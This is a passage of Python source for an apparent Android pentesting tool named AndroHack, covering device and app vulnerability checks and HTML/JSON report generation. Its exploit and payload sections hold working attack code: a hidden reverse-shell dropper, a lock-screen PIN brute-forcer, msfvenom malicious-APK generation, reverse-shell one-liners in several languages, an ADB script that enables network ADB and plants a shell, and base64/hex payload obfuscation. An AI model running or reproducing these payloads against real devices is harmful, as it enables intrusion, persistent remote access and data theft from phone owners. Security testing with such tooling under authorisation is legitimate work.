        console.print(f"[bold red]Device is ROOTED![/] Methods: {', '.join(result['methods'])}")
    else:
        console.print("[green]✓ Device does not appear to be rooted.[/]")
    return result

def check_frida(device_id: str) -> bool:
    """Check if Frida server is running on device."""
    out, _ = run_adb(["shell", "ps | grep frida"], device_id)
    if out and "frida" in out.lower():
        console.print("[bold green]✓ Frida server is running on device![/]")
        return True
    console.print("[yellow]⚠  Frida server not detected.[/]")
    return False

def check_insecure_data_storage(device_id: str, package: str) -> list:
    """Check for insecure data storage in app's data directory."""
    findings = []
    base = f"/data/data/{package}"

    paths_to_check = [
        (f"{base}/shared_prefs/", "SharedPreferences (may contain credentials)"),
        (f"{base}/databases/", "SQLite Databases"),
        (f"{base}/files/", "App Files"),
        (f"{base}/cache/", "App Cache"),
    ]

    console.rule(f"[cyan]Data Storage Check: {package}[/]")
    for path, label in paths_to_check:
        out, _ = run_adb(["shell", f"ls -la {path} 2>/dev/null"], device_id)
        if out and "No such" not in out:
            findings.append({"path": path, "label": label, "files": out})
            console.print(f"  [yellow]⚠  {label}:[/] {path}")
            world_readable = [l for l in out.splitlines() if l.startswith("-rw-rw-rw") or l.startswith("-r--r--r--")]
            if world_readable:
                console.print(f"    [bold red]✗ World-readable files found![/]")
                for f in world_readable[:5]:
                    console.print(f"      [red]▸[/] {f}")

    prefs_out, _ = run_adb(["shell", f"find {base}/shared_prefs -name '*.xml' 2>/dev/null"], device_id)
    if prefs_out:
        for pref_file in prefs_out.splitlines():
            content, _ = run_adb(["shell", f"cat '{pref_file}' 2>/dev/null"], device_id)
            if re.search(r'(?i)(password|token|secret|key|auth)', content or ""):
                findings.append({
                    "path": pref_file,
                    "label": "Sensitive data in SharedPreferences",
                    "files": content[:200],
                })
                console.print(f"  [bold red]🔑 Sensitive keys in SharedPrefs: {pref_file}[/]")

    return findings

def check_exported_components(device_id: str, package: str) -> list:
    """Enumerate exported components using dumpsys."""
    console.rule(f"[cyan]Exported Components: {package}[/]")
    out, _ = run_adb(["shell", f"dumpsys package {package}"], device_id)

    exported = []
    current_section = None
    for line in (out or "").splitlines():
        line = line.strip()
        if "Activity Resolver Table:" in line:
            current_section = "activity"
        elif "Service Resolver Table:" in line:
            current_section = "service"
        elif "Receiver Resolver Table:" in line:
            current_section = "receiver"
        elif "Provider Resolver Table:" in line:
            current_section = "provider"
        elif current_section and package in line and "/" in line:
            comp = line.strip().split()[0] if line.strip().split() else ""
            if comp:
                exported.append({"type": current_section, "component": comp})

    if exported:
        console.rule(f"[bold yellow]📤 Exported Components ({len(exported)})[/]")
        for e in exported:
            console.print(f"[cyan]{e['type']:<10}[/] [white]{e['component']}[/]")
    else:
        console.print("[green]✓ No exported components found via dumpsys.[/]")
    return exported

def check_webview_issues(device_id: str, package: str) -> list:
    """Check for WebView vulnerabilities via logcat pattern."""
    console.rule(f"[cyan]WebView Check: {package}[/]")
    out, _ = run_adb(["shell", f"logcat -d | grep -i '{package}' | grep -iE 'webview|javascript|file://'"], device_id)
    issues = []

    if out:
        if "file://" in out:
            issues.append({"issue": "File access via WebView detected", "severity": "HIGH"})
        if "javascript" in out.lower():
            issues.append({"issue": "JavaScript enabled in WebView", "severity": "MEDIUM"})

    for iss in issues:
        sev = iss["severity"]
        color = "red" if sev == "HIGH" else "yellow"
        console.print(f"  [{color}]⚠  {iss['issue']} ({sev})[/]")

    if not issues:
        console.print("[green]✓ No WebView issues detected in logcat.[/]")
    return issues

def check_task_hijacking(device_id: str, package: str) -> dict:
    """Check for task affinity / StrandHogg vulnerability."""
    out, _ = run_adb(["shell", f"dumpsys package {package} | grep -i taskAffinity"], device_id)
    result = {"vulnerable": False, "detail": ""}
    if out and f"taskAffinity={package}" not in out:
        result["vulnerable"] = True
        result["detail"] = f"Non-default taskAffinity detected: {out.strip()}"
        console.print(f"[bold red]⚠  Task Hijacking risk (StrandHogg): {result['detail']}[/]")
    else:
        console.print("[green]✓ Default taskAffinity — low task hijacking risk.[/]")
    return result

def check_backup_vulnerability(device_id: str, package: str) -> bool:
    """Check if backup is allowed for a package."""
    out, _ = run_adb(["shell", f"dumpsys package {package} | grep 'allowBackup'"], device_id)
    if "allowBackup=true" in (out or ""):
        console.print(f"[bold red]⚠  Backup enabled for {package}! Use: adb backup -f {package}.ab {package}[/]")
        return True
    console.print("[green]✓ Backup disabled.[/]")
    return False

def full_vulnerability_scan(device_id: str, package: str = None) -> dict:
    """Run all vulnerability checks."""
    report = {}
    console.rule("[bold cyan]Full Vulnerability Scan[/]")
    console.print(f"Device: {device_id}  Package: {package or 'N/A'}")

    report["cves"] = check_android_version_cves(device_id)
    report["root"] = check_root_status(device_id)
    report["frida"] = check_frida(device_id)

    if package:
        report["data_storage"] = check_insecure_data_storage(device_id, package)
        report["exported_components"] = check_exported_components(device_id, package)
        report["webview"] = check_webview_issues(device_id, package)
        report["task_hijacking"] = check_task_hijacking(device_id, package)
        report["backup"] = check_backup_vulnerability(device_id, package)

    console.print("\n[bold green]✓ Vulnerability scan complete.[/]")
    return report

# ==================== EXPLOIT ENGINE FUNCTIONS ====================
def launch_exported_activity(device_id: str, package: str, activity: str):
    """Launch an exported activity via ADB intent."""
    component = f"{package}/{activity}"
    console.print(f"[cyan]Launching exported activity:[/] {component}")
    out, rc = run_adb(["shell", "am", "start", "-n", component], device_id)
    if rc == 0:
        console.print(f"[bold green]✓ Activity launched successfully![/]")
    else:
        console.print(f"[red]✗ Failed to launch: {out}[/]")
    return rc == 0

def trigger_broadcast_receiver(device_id: str, package: str, action: str, extras: dict = None):
    """Send a broadcast to trigger an exported receiver."""
    cmd = ["shell", "am", "broadcast", "-a", action, "-p", package]
    if extras:
        for k, v in extras.items():
            cmd += ["--es", k, str(v)]
    out, rc = run_adb(cmd, device_id)
    console.print(f"[{'green' if rc == 0 else 'red'}]Broadcast result:[/] {out}")
    return out

def extract_content_provider(device_id: str, uri: str):
    """Query a content provider URI."""
    console.print(f"[cyan]Querying content provider:[/] {uri}")
    out, rc = run_adb(["shell", "content", "query", "--uri", uri], device_id)
    if out:
        console.rule("[bold]Provider Data[/]")
        console.print(out[:2000])
    else:
        console.print("[yellow]No data returned.[/]")
    return out

def deep_link_fuzzer(device_id: str, package: str, base_scheme: str, wordlist: list = None):
    """Fuzz deep links for the app."""
    if wordlist is None:
        wordlist = [
            "", "admin", "login", "dashboard", "settings", "debug",
            "config", "payment", "token", "auth", "redirect", "file",
            "share", "export", "import", "upload", "download",
            "user", "account", "profile", "api", "internal",
            "test", "staging", "dev", "preview",
        ]

    console.rule(f"[cyan]Deep Link Fuzzer: {base_scheme}://[/]")
    results = []

    for path in wordlist:
        uri = f"{base_scheme}://{path}"
        out, rc = run_adb([
            "shell", "am", "start",
            "-a", "android.intent.action.VIEW",
            "-d", uri,
            "-p", package
        ], device_id)
        status = "✓ LAUNCHED" if rc == 0 and "Error" not in out else "✗ failed"
        color = "green" if rc == 0 and "Error" not in out else "dim"
        console.print(f"  [{color}]{status}[/]  {uri}")
        if rc == 0 and "Error" not in out:
            results.append(uri)
        time.sleep(0.3)

    if results:
        console.print(f"\n[bold green]{len(results)} deep links triggered successfully![/]")
    return results

def frida_injection_guide(package: str):
    """Print Frida injection guide for the target package."""
    console.rule("[bold magenta]Frida Injection Guide[/]")
    guide = f"""
1. Push Frida server to device (as root):
   adb push frida-server /data/local/tmp/frida-server
   adb shell chmod 755 /data/local/tmp/frida-server
   adb shell /data/local/tmp/frida-server &

2. Attach to running process:
   frida -U -p $(adb shell pidof {package}) -l your_script.js

3. Spawn and attach:
   frida -U -f {package} -l your_script.js --no-pause

4. SSL Pinning bypass (objection):
   objection -g {package} explore
   android sslpinning disable

5. Root detection bypass:
   android root disable

6. Dump all classes:
   frida -U -f {package} -e "Java.perform(function(){{ Java.enumerateLoadedClasses({{ onMatch: c => console.log(c), onComplete: ()=>{{}} }}) }})"
    """
    console.print(guide)

def shell_payload_dropper(device_id: str, lhost: str, lport: int):
    """Drop a reverse shell payload via ADB."""
    payload = f"busybox nc {lhost} {lport} -e /system/bin/sh"
    console.rule("[bold red]Reverse Shell Dropper[/]")
    console.print(f"LHOST: {lhost}  LPORT: {lport}")
    console.print(f"Listener command: nc -lvnp {lport}")

    script = f'#!/system/bin/sh\n{payload}\n'
    run_adb(["shell", f"echo '{script}' > /data/local/tmp/.pd_shell.sh"], device_id)
    run_adb(["shell", "chmod 755 /data/local/tmp/.pd_shell.sh"], device_id)
    out3, rc3 = run_adb(["shell", "nohup /data/local/tmp/.pd_shell.sh &"], device_id)

    if rc3 == 0:
        console.print(f"[bold green]✓ Payload deployed! Waiting for connection on {lhost}:{lport}[/]")
    else:
        console.print(f"[red]✗ Payload deployment failed. Device may need root.[/]")
    return rc3 == 0

def extract_database(device_id: str, package: str, db_name: str, output_dir: str = "."):
    """Extract SQLite database from app's data directory."""
    remote = f"/data/data/{package}/databases/{db_name}"
    local = os.path.join(output_dir, db_name)
    console.print(f"[cyan]Extracting database:[/] {remote}")
    out, rc = run_adb(["pull", remote, local], device_id)
    if rc == 0:
        console.print(f"[bold green]✓ Database pulled:[/] {local}")
        console.print(f"[dim]Open with: sqlite3 {local}[/]")
    else:
        console.print(f"[red]✗ Failed. Requires root or backup access.[/]")
    return rc == 0

def bypass_lock_screen(device_id: str):
    """Attempt lock screen bypass using keyevent."""
    console.print("[cyan]Attempting lock screen bypass via ADB keyevents...[/]")
    run_adb(["shell", "input keyevent KEYCODE_WAKEUP"], device_id)
    time.sleep(0.5)
    run_adb(["shell", "input swipe 540 1700 540 900 300"], device_id)
    time.sleep(0.5)
    common_pins = ["0000", "1234", "1111", "2580", "0852", "1212", "7777", "9999"]
    console.print("[yellow]Testing common PINs...[/]")
    for pin in common_pins:
        for digit in pin:
            run_adb(["shell", f"input keyevent KEYCODE_{digit}"], device_id)
            time.sleep(0.1)
        run_adb(["shell", "input keyevent KEYCODE_ENTER"], device_id)
        time.sleep(0.3)
        state, _ = run_adb(["shell", "dumpsys window | grep mDreamingLockscreen"], device_id)
        if "false" in state.lower():
            console.print(f"[bold green]✓ Lock screen bypassed with PIN: {pin}[/]")
            return pin
    console.print("[yellow]⚠  Common PINs failed. Manual exploitation needed.[/]")
    return None

def enable_developer_options(device_id: str):
    """Enable developer options and USB debugging."""
    console.print("[cyan]Enabling developer options...[/]")
    cmds = [
        "settings put global development_settings_enabled 1",
        "settings put global adb_enabled 1",
        "settings put global stay_on_while_plugged_in 3",
    ]
    for cmd in cmds:
        run_adb(["shell", cmd], device_id)
    console.print("[bold green]✓ Developer options enabled![/]")

def exploit_menu(device_id: str):
    """Display exploit selection menu."""
    options = [
        ("1", "Launch Exported Activity"),
        ("2", "Trigger Broadcast Receiver"),
        ("3", "Extract Content Provider"),
        ("4", "Deep Link Fuzzer"),
        ("5", "Frida Injection Guide"),
        ("6", "Drop Reverse Shell Payload"),
        ("7", "Extract SQLite Database"),
        ("8", "Bypass Lock Screen (PIN brute)"),
        ("9", "Enable Developer Options"),
        ("0", "Back"),
    ]

    console.rule("[bold red]💥 Exploit Engine[/]")
    for num, desc in options:
        if num == "0":
            console.print(f"[bold red]  {num:>2}  {desc}[/]")
        else:
            console.print(f"[bold cyan]  {num:>2}[/]  [bold white]{desc}[/]")
    console.rule("[dim]─[/]")
    return options

# ==================== PAYLOAD GENERATOR FUNCTIONS ====================
def _check_tool(tool: str) -> bool:
    try:
        subprocess.run([tool, "--version"], capture_output=True, timeout=5)
        return True
    except FileNotFoundError:
        return False

def generate_msfvenom_apk(lhost: str, lport: int, payload_type: str = "reverse_tcp",
                           output: str = "payload.apk"):
    """Generate a malicious APK using msfvenom."""
    payload_map = {
        "reverse_tcp": "android/meterpreter/reverse_tcp",
        "reverse_https": "android/meterpreter/reverse_https",
        "reverse_http": "android/meterpreter/reverse_http",
        "shell_tcp": "android/shell/reverse_tcp",
    }

    if not _check_tool("msfvenom"):
        console.rule("[bold red]msfvenom Not Found[/]")
        payload = payload_map.get(payload_type, "android/meterpreter/reverse_tcp")
        cmd_str = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o {output}"
        console.print(f"[yellow]Command that would be run:[/]\n{cmd_str}")
        return None

    payload = payload_map.get(payload_type, "android/meterpreter/reverse_tcp")
    cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-o", output]

    console.rule("[bold red]Generating APK Payload[/]")
    console.print(f"Payload: {payload}\nLHOST: {lhost}\nLPORT: {lport}\nOutput: {output}")

    with console.status("[cyan]Running msfvenom...[/]"):
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

    if result.returncode == 0 and os.path.exists(output):
        size = os.path.getsize(output)
        console.print(f"[bold green]✓ APK generated:[/] {output} ({size} bytes)")
        console.rule("[bold cyan]Metasploit Listener[/]")
        console.print(f"msfconsole -q -x 'use multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; run'")
    else:
        console.print(f"[red]✗ msfvenom failed:[/] {result.stderr}")
    return output

def generate_intent_payload(action: str, component: str = None, data: str = None,
                             extras: dict = None, flags: list = None) -> str:
    """Generate an ADB am start payload for intent injection."""
    cmd = ["adb", "shell", "am", "start", "-a", action]
    if component:
        cmd += ["-n", component]
    if data:
        cmd += ["-d", data]
    if extras:
        for k, v in extras.items():
            cmd += ["--es", k, str(v)]
    if flags:
        for f in flags:
            cmd += ["-f", f]

    payload = " ".join(cmd)
    console.rule("[bold cyan]Intent Payload[/]")
    console.print(payload)
    return payload

def generate_reverse_shell_commands(lhost: str, lport: int) -> list:
    """Generate multiple reverse shell one-liners."""
    shells = [
        ("busybox nc",      f"busybox nc {lhost} {lport} -e /system/bin/sh"),
        ("nc traditional",   f"nc -e /system/bin/sh {lhost} {lport}"),
        ("bash TCP",         f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"),
        ("python3",          f"python3 -c 'import socket,os,subprocess;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/system/bin/sh\",\"-i\"])'"),
        ("perl",             f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/system/bin/sh -i\");'"),
        ("socat",            f"socat exec:'/system/bin/sh -i',pty,stderr tcp:{lhost}:{lport}"),
    ]

    console.rule(f"[bold red]💥 Reverse Shell Payloads → {lhost}:{lport}[/]")
    for method, cmd in shells:
        console.print(f"[cyan]{method:<16}[/] [white]{cmd}[/]")
    return shells

def generate_adb_payload_script(device_id: str = None, lhost: str = "10.0.0.1",
                                 lport: int = 4444, output: str = "adb_payload.sh"):
    """Generate a complete ADB exploitation shell script."""
    script_lines = [
        "#!/bin/bash",
        f"# {TOOL_NAME} — ADB Persist & Shell Payload",
        f"# Author: {AUTHOR}",
        f"# Target: {'DEVICE_ID' if not device_id else device_id}",
        f"# LHOST: {lhost}  LPORT: {lport}",
        "",
        "ADB='adb'",
        f"DEVICE='{device_id or ''}'",
        f"LHOST='{lhost}'",
        f"LPORT='{lport}'",
        "",
        "[ -n \"$DEVICE\" ] && ADB=\"adb -s $DEVICE\"",
        "",
        "echo '[*] Checking ADB connection...'",
        "$ADB devices",
        "",
        "echo '[*] Enabling developer options...'",
        "$ADB shell settings put global development_settings_enabled 1",
        "",
        "echo '[*] Enabling WiFi ADB...'",
        "$ADB shell setprop service.adb.tcp.port 5555",
        "$ADB shell stop adbd && $ADB shell start adbd",
        "",
        "echo '[*] Getting device IP...'",
        "DEVICE_IP=$($ADB shell ip addr show wlan0 | grep inet | awk '{print $2}' | cut -d/ -f1)",
        "echo \"[+] Device IP: $DEVICE_IP\"",
        "",
        "echo '[*] Dropping reverse shell...'",
        f"$ADB shell 'echo \"busybox nc {lhost} {lport} -e /system/bin/sh\" > /data/local/tmp/.dh.sh'",
        "$ADB shell chmod 755 /data/local/tmp/.dh.sh",
        "$ADB shell nohup /data/local/tmp/.dh.sh &",
        "",
        "echo '[+] Done! Check your listener.'",
        f"echo '[+] If not connected, try: adb connect $DEVICE_IP:5555'",
    ]

    with open(output, "w") as f:
        f.write("\n".join(script_lines))
    os.chmod(output, 0o755)
    console.print(f"[bold green]✓ ADB payload script written:[/] {output}")
    return output

def obfuscate_payload(payload: str, method: str = "base64") -> str:
    """Obfuscate a shell command."""
    console.rule("[bold]Payload Obfuscation[/]")
    if method == "base64":
        encoded = base64.b64encode(payload.encode()).decode()
        obfuscated = f"echo {encoded} | base64 -d | sh"
        console.print(f"[cyan]Original:[/] {payload}\n[green]Obfuscated (base64):[/] {obfuscated}")
        return obfuscated
    elif method == "hex":
        hex_encoded = payload.encode().hex()
        pairs = [hex_encoded[i:i+2] for i in range(0, len(hex_encoded), 2)]
        hex_str = "\\x" + "\\x".join(pairs)
        obfuscated = f"echo -e '{hex_str}' | sh"
        console.print(f"[cyan]Original:[/] {payload}\n[green]Obfuscated (hex):[/] {obfuscated}")
        return obfuscated
    return payload

def payload_menu():
    """Display payload generator menu."""
    options = [
        ("1", "Generate APK (msfvenom)"),
        ("2", "Generate Intent Payload"),
        ("3", "Reverse Shell One-Liners"),
        ("4", "ADB Exploitation Script"),
        ("5", "Obfuscate Payload (base64/hex)"),
        ("0", "Back"),
    ]
    console.rule("[bold red]🎯 Payload Generator[/]")
    for num, desc in options:
        if num == "0":
            console.print(f"[bold red]  {num:>2}  {desc}[/]")
        else:
            console.print(f"[bold cyan]  {num:>2}[/]  [bold white]{desc}[/]")
    console.rule("[dim]─[/]")
    return options

# ==================== REPORT GENERATOR FUNCTIONS ====================
SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
SEV_BADGE = {
    "CRITICAL": "#ff2d55",
    "HIGH":     "#ff6b35",
    "MEDIUM":   "#f7b731",
    "LOW":      "#2ecc71",
    "INFO":     "#74b9ff",
}

HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AndroHack — Security Report</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Rajdhani:wght@400;600;700&display=swap');
  :root {{
    --bg: #0a0a0f;
    --surface: #12121a;
    --surface2: #1a1a26;
    --border: #2a2a3d;
    --accent: #8b5cf6;
    --accent2: #ec4899;
    --text: #e4e4f0;
    --dim: #6b6b8a;
    --crit: #ff2d55;
    --high: #ff6b35;
    --med: #f7b731;
    --low: #2ecc71;
    --info: #74b9ff;
  }}
  * {{ box-sizing: border-box; margin: 0; padding: 0; }}
  body {{
    background: var(--bg);
    color: var(--text);
    font-family: 'Rajdhani', sans-serif;
    min-height: 100vh;
    background-image:
      radial-gradient(ellipse at 10% 10%, rgba(139,92,246,0.12) 0%, transparent 50%),
      radial-gradient(ellipse at 90% 90%, rgba(236,72,153,0.10) 0%, transparent 50%);
  }}
  header {{
    background: linear-gradient(135deg, #1a0533 0%, #0d0d1a 50%, #1a0533 100%);
    border-bottom: 1px solid var(--accent);
    padding: 2rem 3rem;
    display: flex; justify-content: space-between; align-items: center;
    box-shadow: 0 4px 40px rgba(139,92,246,0.3);
  }}
  .logo {{
    font-size: 2.5rem; font-weight: 700; letter-spacing: 4px;
    background: linear-gradient(135deg, #8b5cf6, #ec4899, #f97316);
    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
  }}
  .logo span {{ font-size: 1rem; color: var(--dim); display: block; font-family: 'JetBrains Mono'; margin-top: 4px; }}
  .meta {{ text-align: right; color: var(--dim); font-family: 'JetBrains Mono'; font-size: 0.8rem; }}
  .meta .target {{ color: var(--accent); font-size: 1rem; font-weight: 600; }}
  main {{ max-width: 1200px; margin: 0 auto; padding: 2rem 2rem; }}
  .stats-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin-bottom: 2rem; }}
  .stat-card {{ background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 1.5rem; text-align: center; transition: all 0.3s; }}
  .stat-card:hover {{ border-color: var(--accent); transform: translateY(-2px); box-shadow: 0 8px 32px rgba(139,92,246,0.2); }}
  .stat-num {{ font-size: 2.5rem; font-weight: 700; font-family: 'JetBrains Mono'; }}
  .stat-label {{ color: var(--dim); font-size: 0.85rem; text-transform: uppercase; letter-spacing: 1px; margin-top: 4px; }}
  .sev-crit {{ color: var(--crit); }} .sev-high {{ color: var(--high); }}
  .sev-med {{ color: var(--med); }} .sev-low {{ color: var(--low); }} .sev-info {{ color: var(--info); }}
  section {{ margin-bottom: 2.5rem; }}
  .section-title {{ font-size: 1.3rem; font-weight: 700; letter-spacing: 2px; text-transform: uppercase; color: var(--accent); border-bottom: 1px solid var(--border); padding-bottom: 0.5rem; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }}
  table {{ width: 100%; border-collapse: collapse; }}
  thead th {{ background: var(--surface2); color: var(--dim); text-transform: uppercase; font-size: 0.75rem; letter-spacing: 1px; padding: 0.75rem 1rem; text-align: left; border-bottom: 1px solid var(--border); }}
  tbody tr {{ border-bottom: 1px solid var(--border); transition: background 0.2s; }}
  tbody tr:hover {{ background: var(--surface2); }}
  td {{ padding: 0.8rem 1rem; font-family: 'JetBrains Mono'; font-size: 0.85rem; }}
  .badge {{ display: inline-block; padding: 2px 10px; border-radius: 99px; font-size: 0.72rem; font-weight: 700; letter-spacing: 1px; text-transform: uppercase; font-family: 'JetBrains Mono'; }}
  .finding-card {{ background: var(--surface); border: 1px solid var(--border); border-radius: 10px; padding: 1.2rem; margin-bottom: 1rem; transition: all 0.2s; }}
  .finding-card:hover {{ border-color: var(--accent); }}
  .finding-header {{ display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 0.5rem; }}
  .finding-name {{ font-size: 1rem; font-weight: 700; color: var(--text); }}
  .finding-detail {{ color: var(--dim); font-size: 0.85rem; margin-top: 0.4rem; font-family: 'JetBrains Mono'; }}
  .finding-fix {{ color: #2ecc71; font-size: 0.8rem; margin-top: 0.5rem; }}
  .cve-link {{ color: var(--accent); text-decoration: none; }}
  .cve-link:hover {{ color: var(--accent2); text-decoration: underline; }}
  footer {{ text-align: center; color: var(--dim); padding: 2rem; border-top: 1px solid var(--border); font-size: 0.8rem; font-family: 'JetBrains Mono'; }}
  footer a {{ color: var(--accent); text-decoration: none; }}
  .disclaimer {{ background: rgba(255,45,85,0.08); border: 1px solid rgba(255,45,85,0.3); border-radius: 8px; padding: 1rem; margin-bottom: 2rem; font-size: 0.85rem; color: #ff6b6b; }}
</style>
</head>
<body>
<header>
  <div>
    <div class="logo">👻 AndroHack<span>Advanced Android Pentesting Framework</span></div>
  </div>
  <div class="meta">
    <div class="target">{target}</div>
    <div>Generated: {timestamp}</div>
    <div>Report ID: {report_id}</div>
    <div>Author: {author}</div>
  </div>
</header>
<main>
  <div class="disclaimer">
    ⚠ This report is intended for authorized security testing only.
    Unauthorized use is illegal and unethical. Always obtain proper written permission before testing.
  </div>

  <div class="stats-grid">
    <div class="stat-card"><div class="stat-num sev-crit">{count_critical}</div><div class="stat-label">Critical</div></div>
    <div class="stat-card"><div class="stat-num sev-high">{count_high}</div><div class="stat-label">High</div></div>
    <div class="stat-card"><div class="stat-num sev-med">{count_medium}</div><div class="stat-label">Medium</div></div>
    <div class="stat-card"><div class="stat-num sev-low">{count_low}</div><div class="stat-label">Low</div></div>
    <div class="stat-card"><div class="stat-num" style="color:var(--accent)">{count_total}</div><div class="stat-label">Total Findings</div></div>
  </div>

  {sections}
</main>
<footer>
  <p>AndroHack &copy; 2026 | Author: <a href="{website}">{author}</a> | For authorized use only</p>
</footer>
</body>
</html>
"""

def _badge(severity: str) -> str:
    color = SEV_BADGE.get(severity.upper(), "#74b9ff")
    return f'<span class="badge" style="background:{color}22;color:{color};border:1px solid {color}55">{severity.upper()}</span>'

def _remediations() -> dict:
    return {
        "Debuggable Application": "Set android:debuggable=false in AndroidManifest.xml and ensure ProGuard/R8 is enabled for release builds.",
        "Backup Enabled": "Set android:allowBackup=false in AndroidManifest.xml to prevent data extraction.",
        "No Network Security Config": "Define a network_security_config.xml that disables cleartext traffic.",
        "Hardcoded Secrets": "Use Android Keystore, encrypted SharedPreferences, or a secrets manager instead of hardcoded values.",
        "Exported Components": "Remove android:exported=true unless necessary; add permission checks to exported components.",
        "Task Hijacking": "Set android:taskAffinity='' and android:launchMode='singleTask' or use FLAG_ACTIVITY_NEW_DOCUMENT.",
        "SSL Pinning Bypassed": "Implement SSL pinning using OkHttp CertificatePinner or TrustKit; use multi-level pinning.",
    }

def generate_html_report(data: dict, output: str = "androhack_report.html") -> str:
    """Generate a styled HTML report."""
    findings = data.get("findings", [])
    target   = data.get("target", "Unknown Target")
    ts       = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    report_id = f"AH-{int(time.time())}"
    rems = _remediations()

    counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    for f in findings:
        sev = f.get("severity", "INFO").upper()
        counts[sev] = counts.get(sev, 0) + 1

    findings_html = '<section><div class="section-title">🚨 Security Findings</div>'
    sorted_findings = sorted(findings, key=lambda x: SEV_ORDER.get(x.get("severity", "INFO").upper(), 99))
    for f in sorted_findings:
        sev = f.get("severity", "INFO")
        name = f.get("name", "Unknown")
        detail = f.get("detail", "")
        cve = f.get("cve")
        fix = rems.get(name, "Review and apply the principle of least privilege.")
        cve_html = f' • <a class="cve-link" href="https://nvd.nist.gov/vuln/detail/{cve}" target="_blank">{cve}</a>' if cve else ""
        findings_html += f"""
        <div class="finding-card">
          <div class="finding-header">
            <div class="finding-name">{name}{cve_html}</div>
            {_badge(sev)}
          </div>
          <div class="finding-detail">{detail}</div>
          <div class="finding-fix">🛡 Remediation: {fix}</div>
        </div>"""
    findings_html += "</section>"

    perms = data.get("permissions", [])
    perms_html = ""
    if perms:
        perms_html = '<section><div class="section-title">🔐 Dangerous Permissions</div><table><thead><tr><th>Permission</th><th>Severity</th></tr></thead><tbody>'
        for p in perms:
            perms_html += f'<tr><td>{p["permission"]}</td><td>{_badge(p["severity"])}</td></tr>'
        perms_html += "</tbody></table></section>"

    urls = data.get("urls", [])
    urls_html = ""
    if urls:
        urls_html = f'<section><div class="section-title">🌐 Embedded URLs ({len(urls)})</div><table><thead><tr><th>URL</th></tr></thead><tbody>'
        for u in urls[:30]:
            urls_html += f"<tr><td>{u}</td></tr>"
        urls_html += "</tbody></table></section>"

    secrets = data.get("secrets", [])
    secrets_html = ""
    if secrets:
        secrets_html = f'<section><div class="section-title">🔑 Hardcoded Secrets ({len(secrets)})</div><table><thead><tr><th>File</th><th>Type</th><th>Snippet</th></tr></thead><tbody>'
        for s in secrets[:20]:
            secrets_html += f"<tr><td>{s['file']}</td><td>{s['type']}</td><td>{s['snippet']}</td></tr>"
        secrets_html += "</tbody></table></section>"

    sections = findings_html + perms_html + secrets_html + urls_html

    html = HTML_TEMPLATE.format(
        target=target,
        timestamp=ts,
        report_id=report_id,
        author=AUTHOR,
        website=WEBSITE,
        count_critical=counts.get("CRITICAL", 0),
        count_high=counts.get("HIGH", 0),
        count_medium=counts.get("MEDIUM", 0),
        count_low=counts.get("LOW", 0),
        count_total=len(findings),
        sections=sections,
    )

    with open(output, "w", encoding="utf-8") as f:
        f.write(html)
    console.print(f"[bold green]✓ HTML report saved:[/] {output}")
    return output

def generate_json_report(data: dict, output: str = "androhack_report.json") -> str:
    """Generate a structured JSON report."""
    report = {
        "tool": "AndroHack",
        "author": AUTHOR,
        "website": WEBSITE,
        "generated": datetime.now().isoformat(),
        "target": data.get("target", "Unknown"),
        "summary": {
            "total_findings": len(data.get("findings", [])),
            "critical": sum(1 for f in data.get("findings", []) if f.get("severity") == "CRITICAL"),
            "high": sum(1 for f in data.get("findings", []) if f.get("severity") == "HIGH"),
            "medium": sum(1 for f in data.get("findings", []) if f.get("severity") == "MEDIUM"),
            "low": sum(1 for f in data.get("findings", []) if f.get("severity") == "LOW"),
        },
        "data": data,
    }
    with open(output, "w") as f:
        json.dump(report, f, indent=2, default=str)
    console.print(f"[bold green]✓ JSON report saved:[/] {output}")
    return output

def print_summary_table(data: dict):
    """Print a CLI summary table of findings."""
    findings = data.get("findings", [])
    SEV_COLOR = {"CRITICAL": "bold red", "HIGH": "red", "MEDIUM": "yellow", "LOW": "green", "INFO": "cyan"}

    console.rule("[bold magenta]📋 Findings Summary[/]")
    sorted_findings = sorted(findings, key=lambda x: SEV_ORDER.get(x.get("severity", "INFO").upper(), 99))
    for i, f in enumerate(sorted_findings, 1):
        sev = f.get("severity", "INFO")
        clr = SEV_COLOR.get(sev.upper(), "white")
        console.print(f"[dim]{i:>3}.[/] [white]{f.get('name', 'Unknown'):<30}[/] [{clr}]{sev:<10}[/] [cyan]{f.get('cve') or 'N/A':<18}[/] [dim]{f.get('detail', '')[:60]}[/]")

# ==================== APK ANALYZER STUB ====================
def analyze_apk(apk_path: str) -> dict:
    """Basic APK analysis placeholder."""
    console.rule("[bold magenta]APK Analyzer[/]")
    console.print(f"[yellow]APK analysis module not fully implemented. File: {apk_path}[/]")
    return {"vulnerabilities": [], "dangerous_permissions": [], "secrets": [], "urls": []}

# ==================== SESSION STORE ====================
_SESSION = {"findings": [], "permissions": [], "secrets": [], "urls": []}

def _save_to_session(data: dict, source: str):
    """Merge findings from a module into the session store."""
    if isinstance(data, dict):
        for vuln in data.get("vulnerabilities", []):
            _SESSION["findings"].append(vuln)
        for vuln in data.get("cves", []):
            _SESSION["findings"].append({
                "name": vuln.get("cve", "CVE"),
